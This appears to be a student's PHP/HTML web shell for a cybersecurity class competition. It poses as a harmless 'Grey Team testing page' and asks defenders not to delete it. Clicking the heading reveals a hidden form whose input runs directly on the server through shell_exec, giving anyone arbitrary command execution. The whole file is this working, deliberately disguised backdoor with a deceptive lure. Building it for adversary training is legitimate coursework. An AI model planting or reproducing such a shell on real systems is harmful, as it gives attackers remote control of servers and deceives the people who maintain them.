<!-- Ben Imbriaco, CSEC 473l-->
<!-- HTML Declaration -->
<!DOCTYPE html>
<!-- This marks the start of the HTML code-->
<html>
<!-- This marks the start of the head section - contain metadata not directly visible to user-->
<head>
    <!-- The title tag is used to define the title of a web page -->
    <title>Command Interface</title>
    <!-- The style tag is used for CSS. CSS is used in this to align with the theme of the competition-->
    <style>
        /* 
        the body section refers to the main section of the webpage.
        This block contains code to configure the spongebob image as the background,
        and makes page the use arial font, align text in center, and pads the body  
        */
        body {
            background-image: url("spongebob.jpg");
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 30px;
        }
        /* 
        This block stores the CSS styling for the HTML h2 heading defined in the body, which is the
        command Box
        */
        h2 {
            color: white;
            background-color: #0077b6;
            padding: 15px;
            border-radius: 10px;
            max-width: 600px;
            margin: 20px auto;
        }
        /*
        This block stores the CSS styling for the "form" (command input) and
        "pre" (command output) sections in the HTML
        */
        form, pre {
            background-color: rgba(255, 255, 255, 0.92);
            padding: 20px;
            border-radius: 10px;
            margin: 20px auto;
            max-width: 600px;
            overflow-x: auto;
        }
        /*
        This block stores the CSS styling for the "input" and "button" sections of
        the HTML code
        */
        input, button {
            padding: 10px;
            border-radius: 6px;
            border: 1px solid #0077b6;
        }
        /*
        Sets the width for the input box 
        */
        input {
            width: 65%;
        }
        /*
        Sets CSS styles for the run button specifically, including
        cursor: pointer which changes the cursor to a pointer when hovering over the button
        */
        button {
            background-color: #ffcc00;
            cursor: pointer;
            font-weight: bold;
        }
        /*
        This changes the background color of the run command button when you hover over it
        */
        button:hover {
            background-color: #ffdb4d;
        }
        /*
        This section hides the commandBox when the page is first loaded
        */
        #commandBox {
            display: none;
        }
    /*
    This tag marks the end of the CSS section
    */
    </style>
<!-- This marks the end of the head section-->
</head>
<!-- This tag denotes the start of the body section, which is used as a container for all visible material on a webpage-->
<body>
    <!-- 
    This section is used to define the h2 section. When this heading is clicked, it calls the showCommandBox function defined
    below. It also displays the below text in the heading
    -->
    <h2 onclick="showCommandBox()">
        Welcome to the Grey Team testing page. Note: this is not the scored web page, but we ask that you don't delete it so that we can troubleshoot during the competition. We hope you enjoy! 
    </h2>
    <!-- 
    This section creates a div container which uses the HTTP POST method to send user data, stored as "command" to the web server
    -->
    <div id="commandBox">
        <form method="POST">
            <input
                type="text"
                name="command"
                placeholder="Enter a command"
                required
            >
            <!--This part creates a button that submits the input using the post method above -->
            <button type="submit">Run!</button>
        </form>
    </div>
    <!--
    This section is the php section of this tool
    -->
    <?php
    # If the browser submitted a post request, continue. Otherwise leave
    if ($_SERVER["REQUEST_METHOD"] === "POST") {
        # create a command variable using the command th euser entered in the html form, using an empty string as fallback if
        # value is null or doesn't exist
        $command = $_POST["command"] ?? "";
        # creates an output variable storing the output of passing the user entered command to a shell
        $output = shell_exec($command);
    # if the output is not null or empty, then continue
    if ($output !== null && $output !== "") {
        # this formats the output for readability
        # htmlspecialchars converts special characters into safe HTML
        echo "<pre>" .
             htmlspecialchars($output, ENT_QUOTES, "UTF-8") .
             "</pre>";
    }
}
# this ends the php section 
?>
    <!-- 
    This section defines the showCommandBox function, which grabs the div element
    with id "commandBox" created earlier
    -->
    <script>
        function showCommandBox() {
            document.getElementById("commandBox").style.display = "block";
        }
    </script>
<!-- This marks the end of the HTML body-->
</body>
<!--This marks the end of the HTML document -->
</html>
